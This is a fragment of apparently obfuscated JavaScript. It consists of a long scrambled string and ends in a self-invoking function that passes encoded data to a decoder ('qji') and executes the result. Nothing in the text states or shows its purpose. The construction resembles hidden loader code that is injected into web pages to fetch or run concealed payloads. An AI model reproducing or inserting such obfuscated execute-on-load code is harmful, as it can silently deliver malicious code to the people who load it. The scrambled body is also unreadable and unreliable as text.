o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
